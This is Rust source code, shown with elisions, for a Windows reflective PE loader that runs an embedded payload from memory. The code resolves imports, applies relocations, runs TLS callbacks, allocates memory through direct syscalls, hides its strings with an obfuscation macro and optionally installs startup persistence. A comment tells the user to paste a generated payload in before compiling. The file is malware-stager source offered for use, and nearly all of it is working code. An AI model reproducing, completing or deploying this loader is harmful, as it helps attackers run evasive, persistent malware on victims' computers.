...
unsafe fn get_data_directory(
    nt_headers: *const IMAGE_NT_HEADERS64,
    index: usize,
) -> *const ImageDataDirectory {
    let optional_header_ptr = &(*nt_headers).OptionalHeader as *const ImageOptionalHeader64;
    let data_dir_ptr = (optional_header_ptr as usize
        + mem::offset_of!(ImageOptionalHeader64, number_of_rva_and_sizes)
        + mem::size_of::<u32>()) as *const ImageDataDirectory;
...
unsafe fn set_section_permissions(
    ...
    if status != 0 {
        return Err(format!(
            "{}{}",
            obfuscate_string!("Failed to set section protection with status: "),
            status
        ));
    }
    Ok(())
...
unsafe fn process_relocations(
    ...
    let mut reloc_ptr =
        image_base.add((*reloc_dir).virtual_address as usize) as *const ImageBaseRelocation;
    ...
    while (reloc_ptr as usize) < (reloc_end as usize) && (*reloc_ptr).size_of_block > 0 {
        let count =
            ((*reloc_ptr).size_of_block as usize - mem::size_of::<ImageBaseRelocation>()) / 2;
        ...
        for i in 0..count {
            ...
            if reloc_type == 3 {
                let patch_addr =
                    image_base.add((*reloc_ptr).virtual_address as usize + offset as usize) as *mut u32;
                *patch_addr = ((*patch_addr as isize) + delta) as u32;
            } else if reloc_type == 10 {
                let patch_addr =
                    image_base.add((*reloc_ptr).virtual_address as usize + offset as usize) as *mut u64;
                *patch_addr = ((*patch_addr as isize) + delta) as u64;
            }
        }
        reloc_ptr =
            (reloc_ptr as usize + (*reloc_ptr).size_of_block as usize) as *const ImageBaseRelocation;
    }
    Ok(())
}
...
unsafe fn resolve_imports(
    ...
    let mut import_desc =
        image_base.add((*import_dir).virtual_address as usize) as *const ImageImportDescriptor;
    while (*import_desc).name != 0 {
        let dll_name_ptr = image_base.add((*import_desc).name as usize);
        let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8);
        let module = LoadLibraryA(PCSTR(dll_name_ptr as *const u8));
        if module.is_err() {
            return Err(format!(
                "{}{:?}{}{}",
                obfuscate_string!("Failed to load DLL: "),
                dll_name,
                obfuscate_string!(" (error: "),
                GetLastError().0
            ));
        }
        ...
        while *thunk_ref != 0 {
            let func_addr = if (*thunk_ref & (1 << 63)) != 0 {
                ...
                GetProcAddress(module.unwrap(), PCSTR(ordinal as usize as *const u8))
            } else {
                let import_by_name =
                    image_base.add(*thunk_ref as usize) as *const ImageImportByName;
                let func_name_ptr = &(*import_by_name).name as *const u8 as *const i8;
                GetProcAddress(
                    module.unwrap(),
                    PCSTR(func_name_ptr as *const u8),
                )
            };
            if func_addr.is_none() {
                return Err(format!(
                    "{}{}",
                    obfuscate_string!("Failed to import function (error: "),
                    GetLastError().0
                ));
            }
            *func_ref = func_addr.unwrap() as usize;
...
unsafe fn process_tls_callbacks(
    ...
    while *callback_ptr != 0 {
        let callback: extern "system" fn(*mut std::ffi::c_void, u32, *mut std::ffi::c_void) =
            mem::transmute(*callback_ptr);
        callback(image_base as *mut _, 1, ptr::null_mut());
...
unsafe fn finalize_sections(
    ...
    let section_header_ptr = (nt_headers as *const IMAGE_NT_HEADERS64 as usize
        ...
        + (*nt_headers).FileHeader.size_of_optional_header as usize)
        as *const ImageSectionHeader;
    for i in 0..(*nt_headers).FileHeader.number_of_sections {
...
unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
    ...
    if nt_headers_offset == 0
        || (nt_headers_offset + mem::size_of::<IMAGE_NT_HEADERS64>()) > pe_data.len()
    {
        return Err(
            obfuscate_string!("Invalid NT header offset or file is too small.").to_string(),
        );
    }
    ...
    let status = (syscalls::SYSCALLS.NtAllocateVirtualMemory)(
        ...
        0,
        &mut region_size,
        (MEM_COMMIT | MEM_RESERVE).0 as u32,
    ...
    if status != 0 {
        return Err(format!(
            "{}{}",
            obfuscate_string!("Memory allocation failed with status: "),
            status
        ));
    }
    ...
    if ENABLE_STARTUP {
        if let Err(e) = persistence::save_payload_with_persistence(pe_data) {
            eprintln!(
                "{}{}",
                obfuscate_string!("[WARNING] Persistence failed: "),
                e
            );
        }
    }
    ...
    // Execute PE
    if nt_headers.OptionalHeader.Subsystem == 2 || nt_headers.OptionalHeader.Subsystem == 3 {
        let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry_point);
        entry_fn();
    } else {
        let dll_main: extern "system" fn(HANDLE, u32, *mut u8) -> i32 =
            mem::transmute(entry_point);
        dll_main(
            HANDLE(image_base as isize),
            1,
            ptr::null_mut(),
        );
    }
...
fn main() {
    #[cfg(windows)]
    {
        if PAYLOAD.is_empty() {
            eprintln!(
                "{}",
                obfuscate_string!("[ERROR] The PAYLOAD is empty. Please generate a payload and paste it into the source code before compiling.")
            );
            return;
        }
        ...
        unsafe {
            if let Err(e) = load_pe_from_memory(&decoded_payload) {
                eprintln!(
                    "{}{}",
                    obfuscate_string!("[ERROR] Failed to load PE from memory: "),
                    e
                );
            }
        }
    ...
    #[cfg(not(windows))]
    {
        eprintln!(
            "{}",
            obfuscate_string!("[ERROR] This program is intended to run on Windows only.")
        );
    }
}
